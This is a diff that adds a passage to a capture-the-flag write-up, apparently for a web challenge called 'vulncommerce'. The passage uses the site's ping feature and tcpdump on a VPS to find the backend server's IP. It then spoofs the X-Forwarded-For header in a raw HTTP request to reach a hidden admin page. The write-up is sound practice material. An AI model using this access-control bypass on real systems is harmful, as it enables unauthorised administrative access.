@@ -449,3 +449,32 @@ ping_target=8.8.17.<FUZZ>
 ```
 
 And no still all FAIL results. I feel I'm on the right track I'm just missing a small part of the puzzle...
+
+OK so I can also ping my own IP, as in the public IP of my router, if I can monitor ping requests then perhaps I can see who's pinged me. One problem with this is my router does not support forwarding. Sooo... I setup a basic VPS and ran the following command and pinged my VPS IP from the stats page
+
+```
+:¬# tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+12:17:10.232064 IP 159.65.24.127 > xxx: ICMP echo request, id 40330, seq 1, length 64
+```
+
+So now all I need to do is to adjust my request to the admin page like so (host is the IP above not the load balancer and the X-Forwarded-For is coming from HQ)
+
+```
+GET /adm1n-man4gem3nt-12bfb3?session_id=ODcyZjI5OWE2MGI3YTVjYWQxMGY3OThiNWQzY2JjYTljZWJmNjFlMGZmODA0Nzg2MzVhOTA3NDVjM2ZlMjBjMzFmYjJlMDA3OWNlNjZkYWJhZmQzNThjYmJhMGI4OGQyNzBiY2Q0NDlmNjU2NmVjZGZkZDk4MDVhOWNlOGI1MjE= HTTP/1.1
+Host: 159.65.24.127
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+X-Forwarded-For: 8.8.17.22
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: ctfchallenge=xxx=;
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+And the response
+
+![flag](./images/vulncommerce-12.png)
+
